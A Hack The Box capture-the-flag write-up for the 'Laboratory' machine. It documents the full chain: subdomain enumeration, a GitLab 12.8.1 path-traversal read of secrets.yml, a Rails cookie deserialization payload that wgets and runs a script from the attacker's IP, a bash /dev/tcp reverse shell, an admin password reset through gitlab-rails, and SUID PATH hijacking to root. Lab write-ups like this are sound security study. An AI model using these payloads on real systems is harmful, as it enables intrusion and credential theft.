# Introduction

[![Laboratory](https://1.bp.blogspot.com/-QMNR6LckGZA/X7p-gYNZYxI/AAAAAAAAGnU/P6yFx9-cXdcml-USeeaTRU4FsSCti-RTgCLcBGAsYHQ/s0/infocard.png)](https://www.hackthebox.eu/home/machines/profile/298)

| Point | Description |
| :------:| :------: |
| Name | Laboratory   |
| OS   | Linux  |
| Difficulty Ratings| Medium   |
| Release | 14 Nov 2020   |
| IP | 10.10.10.216   |
| Owned | 16.01.2021 |
# Short retelling
* Using Nmap and find new subdomain
* Register on this site and find version of service
* Find CVE for this kind of web-server
* Checking CVE
* Run Docker same version
* Configure it and create explotation of RCE
* Upload reverse shell comand to web-server and run it
* Connected to machine
* Trying to escape from docker, use git railway-console
* Change password of gitlab's administration
* Sign in with admin login and our new password
* Find id_rsa in folder /.ssh
* SSH coonect to the host and find user.txt
* Find bin programm
* Check it with radare2
* Find way to use the path hijacking
* Get root.txt

# Enumeration

## Nmap
Start to recon host laboratory 10.10.10.216

```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -sC -p- 10.10.10.216 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 08:42 EST
Nmap scan report for laboratory.htb (10.10.10.216)
Host is up (0.16s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lets add laboratory.htb to /etc/hosts and check site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/1.jpg)

## Dirb

We don't see anything scripts or plugins, also there isn't authorization form. Lets check open directory of laboratory.htb.

```
┌──(root💀kali)-[/home/kali]
└─# dirb https://laboratory.htb/                                                                                                                                     130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jan 18 08:59:33 2021
URL_BASE: https://laboratory.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://laboratory.htb/ ----
==> DIRECTORY: https://laboratory.htb/assets/                                                                                                                             
==> DIRECTORY: https://laboratory.htb/images/                                                                                                                             
+ https://laboratory.htb/index.html (CODE:200|SIZE:7254)                                                                                                                  
+ https://laboratory.htb/server-status (CODE:403|SIZE:280)                                                                                                                
                                                                                                                                                                          
---- Entering directory: https://laboratory.htb/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                          
---- Entering directory: https://laboratory.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
```
We find some files in these dirbs, checking everithing and nothithng interesting.

## ffuf

Next step will try to bruteforce subdomain.

```
┌──(root💀kali)-[/home/kali/HTB]
└─# ffuf -w /home/kali/HTB/Laboratory/subdomains-top1million-110000.txt -u https://laboratory.htb/ -H "Host:FUZZ.laboratory.htb" -fw 426

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://laboratory.htb/
 :: Wordlist         : FUZZ: /home/kali/HTB/Laboratory/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.laboratory.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 426
________________________________________________

git                     [Status: 302, Size: 105, Words: 5, Lines: 1]
:: Progress: [114532/114532] :: Job [1/1] :: 256 req/sec :: Duration: [0:08:05] :: Errors: 0 ::
```
We could find subdomain __git__.
In results of nmap scan we can see info about subdomain too: *Subject Alternative Name: DNS:git.laboratory.htb*.
Add git.laboratory.htb to /etc/hosts

And we can see that **gitlab** is hosted on *git.laboratory.htb*.

# Explotation#1

I guess we need to find CVE for this version of gitlab. But in *https://git.laboratory.htb/help* we dont see any info about verion of gitlab.
Anyway, there is "register" and "sign in" form, lets try registered my self.
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/2.jpg)

And logged in.
Now version of gitlab is available tu us in *https://git.laboratory.htb/help*
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/3.jpg)

Lets find some CVE for this version. And we got it.

* https://hackerone.com/reports/827052
* https://xakep.ru/2020/05/26/gitlab-exploit/

I will follow the "xakep" magazine article. This CVE is about LFI & RCE.

First we will check LFI:

* We need to create two projects. For example TEST1 and TEST2.
* After we need to create *issue* in one of project.
* Add screenshot in description of *issue*
> ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/4.jpg)
* After saving, edit description for issue like `![Screenshot_2021-01-11_10_04_37](/uploads/5b87a86991332598febe11dadd2855d7/../../../../../../../../../../../../../../../../etc/passwd)`. Submit issue.
* And move issue to another project (TEST1).
* We can read /etc/passwd
> ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/5.jpg)
```
oot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

# Explotation#2

Now we can read files on the srever and need to perform RCE.

For using RCE we need to read `secret_key_base` `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

`![Screenshot_2021-01-11_10_04_37](/uploads/9d6e6e4bfd8dfcec43059a232b87b6f9/../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`

and same moving issue.

```
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
```

Saving `secret_key_base`
```3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3```

Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in another virtual machine.

```docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0```

```docker exec -ti gitlab /bin/bash```

Edit `secret_key` in /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

```
gitlab-ctl reconfigure
gitlab-ctl restart
gitlab-rails console
```

And create payload

```
request = ActionDispatch::Request.new(Rails.application.env_config)

request.env["action_dispatch.cookies_serializer"] = :marshal

cookies = request.cookie_jar

erb = ERB.new("<%= `wget http://10.10.14.162:8888/pasha.sh && chmod +x pasha.sh && /bin/bash pasha.sh` %>")

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)

cookies.signed[:cookie] = depr
```

And we got a payload:
```
AhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec
```

Now we create reverse shell *pasha.sh*
```
bash -i >& /dev/tcp/10.10.14.162/1234 0>&1
```

After start `python3 -m http.server 8888`
And use `nc -nlvp 1234`

We need install extensions *Cookie-Editor* in Mozilla fire fox. And login with "Remeber me".
We wiil send a cookie payload to *remeber_user_token*
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/6.jpg)

Starting payload...

```
┌──(root💀kali)-[/home/kali/HTB/Labartory]
└─# curl -k 'https://git.laboratory.htb/' -b "remember_user_token=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec"
```

And we get a shell of system user **git**
```
┌──(root💀kali)-[/home/kali/HTB/Labartory]
└─# nc -nlvp 1234                                                                                                                                                      1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.162] from (UNKNOWN) [10.10.10.216] 46810
bash: cannot set terminal process group (403): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ 
```
# Privilege Escalation

## Get User.txt

Checking directories and nothing interesting

To find way for Privilege Escalation we will use [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
Go to /tmp and use `linpeas -a > /tmp/linpeas.txt`
After complete download this file to our host and reead with `less -r linpeas.txt`

Analyzing the file we find out, that it is docker container
```
[+] Searching Signature verification failed in dmseg                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                        
 Not Found
                                                                                                                                                                           
[+] AppArmor enabled? .............. AppArmor Not Found                                                                                                                    
[+] grsecurity present? ............ grsecurity Not Found                                                                                                                  
[+] PaX bins present? .............. PaX Not Found                                                                                                                         
[+] Execshield enabled? ............ Execshield Not Found                                                                                                                  
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes                                                                                                                                   
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (docker)
[+] Is this a container? ........... Looks like we're in a Docker container                                                                                                
[+] Any running containers? ........ No
```

And also we find list of users, who have been registered in gitlab. And one of these is **Dexter**, we saw him on http://laboratory.htb. **Dexter** is admin of gitlab too.
```
[+] Searching GitLab related files
gitlab-rails was found. Trying to dump users...
{"id"=>1,
 "email"=>"admin@example.com",
 "encrypted_password"=>
  "$2a$10$rlBhJEVDyb/sUML.SMNx3u0gK9vM6cf4THW.o.en.IYYoTqSnswDi",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>9,
 "current_sign_in_at"=>Fri, 15 Jan 2021 15:00:41 UTC +00:00,
 "last_sign_in_at"=>Tue, 20 Oct 2020 18:39:24 UTC +00:00,
 "current_sign_in_ip"=>"172.17.0.1",
 "last_sign_in_ip"=>"172.17.0.1",
 "created_at"=>Thu, 02 Jul 2020 18:02:18 UTC +00:00,
 "updated_at"=>Fri, 15 Jan 2021 15:00:41 UTC +00:00,
 "name"=>"Dexter McPherson",
 "admin"=>true,
 "projects_limit"=>100000,
 "skype"=>"",
 "linkedin"=>"",
 "twitter"=>"",
 "bio"=>"",
 "failed_attempts"=>0,
 "locked_at"=>nil,                                                                                                                                                         
 "username"=>"dexter",                                                                                                                                                     
 "can_create_group"=>true,                                                                                                                                                 
 "can_create_team"=>false,                                                                                                                                                 
 "state"=>"active",                                                                                                                                                        
 "color_scheme_id"=>1,
 ...
```
We got a user's hash of password `$2a$10$rlBhJEVDyb/sUML.SMNx3u0gK9vM6cf4THW.o.en.IYYoTqSnswDi`
It's intereting...

Continue reading the file and find out:
```
If you have enough privileges, you can change the password of any user runnig: gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'tories inside gitlab using 'gitlab-backup create'
Then you can get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'
```

I think it is our way, because i couldnt bruteforcing password hash...

Lets [spawn a tty shell](https://netsec.ws/?p=337) `python3 -c 'import pty; pty.spawn("/bin/sh")'`
After run `gitlab-rails console` and follow instruction form linpeas.sh

And we got `irb` console
```
git@git:~/gitlab-rails/working$ python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
$ gitlab-rails console
gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0> 
```
```
irb(main):001:0> user = User.where(id: 1).first
user = User.where(id: 1).first
user = User.where(id: 1).first
=> #<User id:1 @dexter>
irb(main):002:0> user.password = 'HelloWorld'
user.password = 'HelloWorld'
user.password = 'HelloWorld'
=> "HelloWorld"
irb(main):003:0> user.password_confirmation = 'HelloWorld'
user.password_confirmation = 'HelloWorld'
user.password_confirmation = 'HelloWorld'
=> "HelloWorld"
irb(main):004:0> user.save!
user.save!
user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: 5f517ebe-565e-4603-947c-ffb39e418cec) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f8c355fc378 @uri=#<URI::GID gid://gitlab/User/1>>
=> true
```

Now we can login with username: **dexter** and password: **HelloWorld**. 
Do this and have success.
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/8.PNG)

Look around and find *id_rsa* in directory ./shh

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/9.PNG)

SSH coonect
```
chmod 600 id_rsa 
ssh -i id_rsa dexter@laboratory.htb
```

And we find **User.txt*
```
dexter@laboratory:~$ ls
user.txt
dexter@laboratory:~$ cat user.txt 
11d2cfcca9d99dc2194b09a0c6bfe4b2
```

## Get Root.txt

Here I also will use [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
Analyzing...
And we see interesting SUID file
```
====================================( Interesting Files )=====================================                                                                             
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
...
-rwsr-xr-x 1 root   dexter           17K Aug 28 14:52 /usr/local/bin/docker-security
```
Go to `/usr/local/bin/` and run it try ./docker-security and nothing.
We need in reverse engineering.

Will use tool [radare2](https://forum.reverse4you.org/t/radare-2/1113)

Download `docker-security` to our host and start reversing...

* Check info about bin file
```
┌──(root💀kali)-[~kali/HTB/Labartory]
└─# rabin2 -I docker-security 
arch     x86
baddr    0x0
binsz    14795
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Debian 10.1.0-6) 10.1.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

* Start analyzing file
```
┌──(root💀kali)-[~kali/HTB/Labartory]
└─# r2 ./docker-security     
[0x00001070]> ie
[Entrypoints]
vaddr=0x00001070 paddr=0x00001070 haddr=0x00000018 hvaddr=0x00000018 type=program

1 entrypoints

[0x00001070]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

* Find all strings in bin
```
[0x00001070]> izz
[Strings]
nth paddr      vaddr      len size section   type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034 0x00000034 4   10             utf16le @8\v@
1   0x000002a8 0x000002a8 27  28   .interp   ascii   /lib64/ld-linux-x86-64.so.2
2   0x00000409 0x00000409 6   7    .dynstr   ascii   setuid
3   0x00000410 0x00000410 6   7    .dynstr   ascii   system
4   0x00000417 0x00000417 14  15   .dynstr   ascii   __cxa_finalize
5   0x00000426 0x00000426 6   7    .dynstr   ascii   setgid
6   0x0000042d 0x0000042d 17  18   .dynstr   ascii   __libc_start_main
7   0x0000043f 0x0000043f 9   10   .dynstr   ascii   libc.so.6
8   0x00000449 0x00000449 11  12   .dynstr   ascii   GLIBC_2.2.5
9   0x00000455 0x00000455 27  28   .dynstr   ascii   _ITM_deregisterTMCloneTable
10  0x00000471 0x00000471 14  15   .dynstr   ascii   __gmon_start__
11  0x00000480 0x00000480 25  26   .dynstr   ascii   _ITM_registerTMCloneTable
12  0x00001117 0x00001117 4   5    .text     ascii   u/UH
13  0x000011e1 0x000011e1 11  12   .text     ascii   \b[]A\A]A^A_
14  0x00002008 0x00002008 25  26   .rodata   ascii   chmod 700 /usr/bin/docker
15  0x00002028 0x00002028 30  31   .rodata   ascii   chmod 660 /var/run/docker.sock
16  0x00002098 0x00002098 4   5    .eh_frame ascii   \e\f\a\b
17  0x000020c8 0x000020c8 4   5    .eh_frame ascii   \e\f\a\b
18  0x000020ef 0x000020ef 5   6    .eh_frame ascii   ;*3$"
19  0x00002129 0x00002129 4   5    .eh_frame ascii   n\f\a\b
20  0x00003040 0x00000000 29  30   .comment  ascii   GCC: (Debian 10.1.0-6) 10.1.0
21  0x00003691 0x00000001 10  11   .strtab   ascii   crtstuff.c
22  0x0000369c 0x0000000c 20  21   .strtab   ascii   deregister_tm_clones
23  0x000036b1 0x00000021 21  22   .strtab   ascii   __do_global_dtors_aux
24  0x000036c7 0x00000037 11  12   .strtab   ascii   completed.0
25  0x000036d3 0x00000043 38  39   .strtab   ascii   __do_global_dtors_aux_fini_array_entry
26  0x000036fa 0x0000006a 11  12   .strtab   ascii   frame_dummy
27  0x00003706 0x00000076 30  31   .strtab   ascii   __frame_dummy_init_array_entry
28  0x00003725 0x00000095 17  18   .strtab   ascii   docker-security.c
29  0x00003737 0x000000a7 13  14   .strtab   ascii   __FRAME_END__
30  0x00003745 0x000000b5 16  17   .strtab   ascii   __init_array_end
31  0x00003756 0x000000c6 8   9    .strtab   ascii   _DYNAMIC
32  0x0000375f 0x000000cf 18  19   .strtab   ascii   __init_array_start
33  0x00003772 0x000000e2 18  19   .strtab   ascii   __GNU_EH_FRAME_HDR
34  0x00003785 0x000000f5 21  22   .strtab   ascii   _GLOBAL_OFFSET_TABLE_
35  0x0000379b 0x0000010b 15  16   .strtab   ascii   __libc_csu_fini
36  0x000037ab 0x0000011b 27  28   .strtab   ascii   _ITM_deregisterTMCloneTable
37  0x000037c7 0x00000137 6   7    .strtab   ascii   _edata
38  0x000037ce 0x0000013e 19  20   .strtab   ascii   system@@GLIBC_2.2.5
39  0x000037e2 0x00000152 30  31   .strtab   ascii   __libc_start_main@@GLIBC_2.2.5
40  0x00003801 0x00000171 12  13   .strtab   ascii   __data_start
41  0x0000380e 0x0000017e 14  15   .strtab   ascii   __gmon_start__
42  0x0000381d 0x0000018d 12  13   .strtab   ascii   __dso_handle
43  0x0000382a 0x0000019a 14  15   .strtab   ascii   _IO_stdin_used
44  0x00003839 0x000001a9 15  16   .strtab   ascii   __libc_csu_init
45  0x00003849 0x000001b9 11  12   .strtab   ascii   __bss_start
46  0x00003855 0x000001c5 4   5    .strtab   ascii   main
47  0x0000385a 0x000001ca 19  20   .strtab   ascii   setgid@@GLIBC_2.2.5
48  0x0000386e 0x000001de 11  12   .strtab   ascii   __TMC_END__
49  0x0000387a 0x000001ea 25  26   .strtab   ascii   _ITM_registerTMCloneTable
50  0x00003894 0x00000204 19  20   .strtab   ascii   setuid@@GLIBC_2.2.5
51  0x000038a8 0x00000218 27  28   .strtab   ascii   __cxa_finalize@@GLIBC_2.2.5
52  0x000038c5 0x00000001 7   8    .shstrtab ascii   .symtab
53  0x000038cd 0x00000009 7   8    .shstrtab ascii   .strtab
54  0x000038d5 0x00000011 9   10   .shstrtab ascii   .shstrtab
55  0x000038df 0x0000001b 7   8    .shstrtab ascii   .interp
56  0x000038e7 0x00000023 18  19   .shstrtab ascii   .note.gnu.build-id
57  0x000038fa 0x00000036 13  14   .shstrtab ascii   .note.ABI-tag
58  0x00003908 0x00000044 9   10   .shstrtab ascii   .gnu.hash
59  0x00003912 0x0000004e 7   8    .shstrtab ascii   .dynsym
60  0x0000391a 0x00000056 7   8    .shstrtab ascii   .dynstr
61  0x00003922 0x0000005e 12  13   .shstrtab ascii   .gnu.version
62  0x0000392f 0x0000006b 14  15   .shstrtab ascii   .gnu.version_r
63  0x0000393e 0x0000007a 9   10   .shstrtab ascii   .rela.dyn
64  0x00003948 0x00000084 9   10   .shstrtab ascii   .rela.plt
65  0x00003952 0x0000008e 5   6    .shstrtab ascii   .init
66  0x00003958 0x00000094 8   9    .shstrtab ascii   .plt.got
67  0x00003961 0x0000009d 5   6    .shstrtab ascii   .text
68  0x00003967 0x000000a3 5   6    .shstrtab ascii   .fini
69  0x0000396d 0x000000a9 7   8    .shstrtab ascii   .rodata
70  0x00003975 0x000000b1 13  14   .shstrtab ascii   .eh_frame_hdr
71  0x00003983 0x000000bf 9   10   .shstrtab ascii   .eh_frame
72  0x0000398d 0x000000c9 11  12   .shstrtab ascii   .init_array
73  0x00003999 0x000000d5 11  12   .shstrtab ascii   .fini_array
74  0x000039a5 0x000000e1 8   9    .shstrtab ascii   .dynamic
75  0x000039ae 0x000000ea 8   9    .shstrtab ascii   .got.plt
76  0x000039b7 0x000000f3 5   6    .shstrtab ascii   .data
77  0x000039bd 0x000000f9 4   5    .shstrtab ascii   .bss
78  0x000039c2 0x000000fe 8   9    .shstrtab ascii   .comment
```
Find string **main**

* Find function in bin

```
[0x00001155]> afl
0x00001070    1 42           entry0
0x000010a0    4 41   -> 34   sym.deregister_tm_clones
0x000010d0    4 57   -> 51   sym.register_tm_clones
0x00001110    5 57   -> 50   entry.fini0
0x00001150    1 5            entry.init0
0x00001000    3 23           sym._init
0x000011f0    1 1            sym.__libc_csu_fini
0x000011f4    1 9            sym._fini
0x00001190    4 93           sym.__libc_csu_init
0x00001155    1 51           main
0x00001050    1 6            sym.imp.setuid
0x00001040    1 6            sym.imp.setgid
0x00001030    1 6            sym.imp.system
```

* Checking function **main**
```
[0x00001045]> s main
[0x00001155]> pdf
            ; DATA XREF from entry0 @ 0x108d
┌ 51: int main (int argc, char **argv, char **envp);
│           0x00001155      55             push rbp
│           0x00001156      4889e5         mov rbp, rsp
│           0x00001159      bf00000000     mov edi, 0
│           0x0000115e      e8edfeffff     call sym.imp.setuid
│           0x00001163      bf00000000     mov edi, 0
│           0x00001168      e8d3feffff     call sym.imp.setgid
│           0x0000116d      488d3d940e00.  lea rdi, qword str.chmod_700__usr_bin_docker ; 0x2008 ; "chmod 700 /usr/bin/docker" ; const char *string
│           0x00001174      e8b7feffff     call sym.imp.system         ; int system(const char *string)
│           0x00001179      488d3da80e00.  lea rdi, qword str.chmod_660__var_run_docker.sock ; 0x2028 ; "chmod 660 /var/run/docker.sock" ; const char *string
│           0x00001180      e8abfeffff     call sym.imp.system         ; int system(const char *string)
│           0x00001185      90             nop
│           0x00001186      5d             pop rbp
└           0x00001187      c3             ret
```

We see, that `docker-security` is using `chmod` without specifying it full path.
It's time to use path hijacking vuln.

Making a new shell script with name chmod.
It will give us a bash shell as root
```
dexter@laboratory:/usr/local/bin$ cd ~
dexter@laboratory:~$ echo '/bin/bash' >> chmod
dexter@laboratory:~$ cat chmod
/bin/bash
```

Export the PATH to script directory
```
dexter@laboratory:~$ pwd
/home/dexter
dexter@laboratory:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ export PATH=$(pwd):$PATH
dexter@laboratory:~$ echo $PATH
/home/dexter:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:~$ 
```

Give execute permission to our chmod and exec
```
dexter@laboratory:~$ chmod +x chmod
dexter@laboratory:~$ ls -lvp
total 8
-rwxr-xr-x 1 dexter dexter 10 Jan 19 15:51 chmod
-r--r----- 1 root   dexter 33 Jan 19 05:53 user.txt
```

Go to `/usr/local/bin/` and run it again `./docker-security`.
And we get root shell and root.txt.
```
dexter@laboratory:~$ cd /usr/local/bin/
dexter@laboratory:/usr/local/bin$ ./docker-security 
root@laboratory:/usr/local/bin# id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
root@laboratory:/usr/local/bin# cd /root/
root@laboratory:/root# ls
root.txt
root@laboratory:/root# cat root.txt 
08a05343bef561f61e7461dc3d76a321
```

# Result and Resources

1. https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
2. https://netsec.ws/?p=337
3. https://xakep.ru/2020/05/26/gitlab-exploit/
4. https://forum.reverse4you.org/t/radare-2/1113
5. https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480
6. https://docs.gitlab.com/12.10/ee/security/reset_root_password.html
